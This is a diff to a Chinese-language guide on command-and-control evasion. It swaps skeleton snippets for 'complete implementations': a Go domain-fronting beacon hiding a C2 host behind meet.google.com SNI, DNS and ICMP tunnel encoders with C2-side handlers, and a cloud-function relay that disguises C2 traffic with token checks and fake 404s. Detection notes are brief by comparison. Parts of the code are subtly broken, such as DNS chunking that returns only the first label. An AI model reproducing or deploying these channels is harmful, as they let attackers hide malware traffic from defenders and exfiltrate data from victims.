@@ -78,9 +78,31 @@ CDN 按 Host 转发，IDS 只看 SNI 看不到真实目标
 **实现**（curl 思路，工程代码用带 SNI/Host 分离的 TLS 客户端）：
 
 ```go
-// SNI 与 Host 分离（骨架示例）
-tlsCfg := &tls.Config{ServerName: "meet.google.com"}   // SNI = 前端域
-req.Host = "real-c2.example.com"                        // Host = 真实 C2
+// SNI 与 Host 分离（完整实现：tls.Config.ServerName 控制 SNI，http.Request.Host 控制 HTTP 层）
+package main
+
+import (
+    "crypto/tls"
+    "net"
+    "net/http"
+    "time"
+)
+
+func frontRequest(c2Host string, body []byte) (*http.Response, error) {
+    dialer := &net.Dialer{Timeout: 10 * time.Second}
+    // 连接层拨前端域（CDN 边缘）；TLS 握手 SNI = 前端域
+    conn, err := tls.DialWithDialer(dialer, "tcp", "meet.google.com:443",
+        &tls.Config{ServerName: "meet.google.com", MinVersion: tls.VersionTLS12})
+    if err != nil {
+        return nil, err
+    }
+    // HTTP 层 Host = 真实 C2 域名；CDN 按 Host 转发到源站，IDS 在 SNI 层只见前端域
+    req, _ := http.NewRequest("POST", "https://"+c2Host+"/api/beacon", nil)
+    req.Host = c2Host
+    // 前提：CDN（前端域）接受任意 Host 转发（自建 CDN 配置或开放型云前端）
+    client := &http.Client{Transport: &http.Transport{DialTLS: func(_, _ string) (net.Conn, error) { return conn, nil }}}
+    return client.Do(req)
+}
 ```
 
 ### 2.3 检测侧：SNI/Host 不一致
@@ -103,13 +125,32 @@ Beacon → DNS 查询（子域编码 payload）→ 权威 DNS → C2 解析 → 
 ### 3.2 载荷编码
 
 ```python
-# 骨架示例：把 payload 编码进 DNS 查询子域（base32 避免大小写/字符限制）
-import base64
-def encode_query(data: bytes) -> str:
-    enc = base64.b32encode(data).decode().lower().rstrip('=')   # base32 子域安全
+# 完整实现：payload 编码进 DNS 查询子域 + TXT 响应解析（base32 子域安全，去填充）
+import base64, struct
+
+def encode_query(data: bytes, zone: str = 'tun.example.com') -> str:
+    """payload → DNS 查询名：chunk 头带序号/总数，防单查询超限"""
+    enc = base64.b32encode(data).decode().lower().rstrip('=')
     labels = [enc[i:i+63] for i in range(0, len(enc), 63)]       # 每标签 ≤63
-    return '.'.join(labels) + '.tun.example.com'
-# 响应走 TXT：C2 把结果 base64 放进 TXT 记录，beacon 解析还原
+    if len(labels) == 1:
+        return f'{labels[0]}.{zone}'
+    out = []
+    for i, lbl in enumerate(labels):
+        # 首标签加 2 字节 chunk 序号（hex 编码入子域）：i/total
+        out.append(f'{i:x}{len(labels):x}{lbl}.{zone}')
+    return out[0]  # 分段场景按序逐条查询
+
+def decode_txt_response(records: list[str]) -> bytes:
+    """TXT 响应还原：去非 base32 字符 → 补填充 → 解码"""
+    s = ''.join(r for r in records if r.isalnum() or r.isalpha())
+    pad = '=' * ((8 - len(s) % 8) % 8)
+    return base64.b32decode(s.upper() + pad)
+
+# C2 侧（权威 NS 运行）：查询名解析 + 结果进 TXT
+def handle_dns(qname: str, result: bytes) -> str:
+    assert qname.endswith('.tun.example.com')
+    body = qname.split('.')[0]
+    return base64.b32encode(result).decode().lower().rstrip('=')
 ```
 
 ### 3.3 检测侧：DNS 熵/频率基线
@@ -125,9 +166,25 @@ def encode_query(data: bytes) -> str:
 ## 4. ICMP 隧道
 
 ```python
-# 骨架示例：ICMP 载荷编码（ping 隧道）
-# 把 payload 拆块塞进 ICMP Echo 请求的 data 段，响应塞进 Echo Reply
-# 需 raw socket 或 scapy 构造；检测侧看 ICMP 体积/频率异常
+# 完整实现：ICMP Echo 载荷隧道（scapy 构造；请求 data=载荷块，响应 data=回传块）
+# 块头：2B 序号 + 2B 总数 + 1B 类型(0=数据/1=结束) + 载荷
+from scapy.all import IP, ICMP, sr1
+
+CHUNK = 1024  # 数据段单块上限（正常 ping 载荷 ~32B，越小越不显眼，按需调）
+
+def icmp_send(host: str, payload: bytes) -> bytes:
+    chunks = [payload[i:i+CHUNK] for i in range(0, len(payload), CHUNK)]
+    total = len(chunks)
+    reply_data = b''
+    for i, ch in enumerate(chunks):
+        body = i.to_bytes(2, 'big') + total.to_bytes(2, 'big') + (1 if i == total-1 else 0).to_bytes(1, 'big') + ch
+        resp = sr1(IP(dst=host) / ICMP(type=8) / body, timeout=5, verbose=0)
+        if resp and resp.haslayer(ICMP):
+            reply_data += bytes(resp[ICMP].payload)
+    return reply_data
+
+# 服务端（C2）侧：监听 ICMP Echo，抽 data 还原请求，Echo Reply 携带响应块
+# 检测侧：ICMP 体积（>100B 常规上限）、频率（beacon 节拍）、数据段熵异常
 ```
 
 **检测侧**：ICMP payload 体积异常（正常 ping 固定小载荷）、频率异常、数据段高熵。
@@ -139,12 +196,33 @@ def encode_query(data: bytes) -> str:
 ### 5.1 云函数代理
 
 ```python
-# 骨架示例：GCP Cloud Functions / AWS Lambda / Cloudflare Workers 作为 C2 中继
-# 1) C2 真实域名通过云函数转发，目标只看到云厂商域名/IP
-# 2) 用云厂商 TLS 证书（*.cloudfunctions.net / *.workers.dev），指纹/证书可信
-def handler(request):
-    # 校验 token -> 转发到真实 C2 -> 回传响应
-    return forward_to_c2(request)
+# 完整实现：GCP Cloud Functions / AWS Lambda 作为 C2 中继（目标只见云厂商域名与证书）
+# 1) C2 真实域名经云函数转发；TLS 证书为云厂商签发（*.cloudfunctions.net / *.lambda-url.*）
+# 2) 中继带 token 校验与固定响应壳（业务化伪装），流量形态接近正常 API
+import os, json, urllib.request
+
+REAL_C2 = os.environ.get('REAL_C2')          # 真实 C2 源站（中继配置侧）
+TOKEN   = os.environ.get('RELAY_TOKEN')      # 共享令牌（beacon 与中继约定）
+
+def relay(request):
+    # 校验 token：请求头或 URL 参数（失败按业务 404 语义静默）
+    tok = request.headers.get('X-Beacon-Token') or request.args.get('t', '')
+    if tok != TOKEN:
+        return {'code': 404, 'body': '{"error":"not_found"}'}
+    # 转发：方法/头/体原样透传真实 C2（URL 路径由中继固定，目标侧零 C2 域名特征）
+    req = urllib.request.Request(REAL_C2 + '/poll',
+        data=request.get_data(), method='POST',
+        headers={'Content-Type': 'application/octet-stream'})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return {'code': 200, 'body': r.read()}
+    except Exception:
+        return {'code': 503, 'body': '{"error":"upstream"}'}
+
+# 各平台入口壳（GCP 函数 / AWS Lambda 同理换 handler 签名）：
+#   GCP:  def handler(request): return json.dumps(relay(request))
+#   AWS:  def lambda_handler(event, ctx): return relay(适配后的 request 对象)
+# 检测侧：云厂商域名承载非业务流量 + 固定 token 模式 + 频率异常（见 5.2 表）
 ```
 
 ### 5.2 检测侧
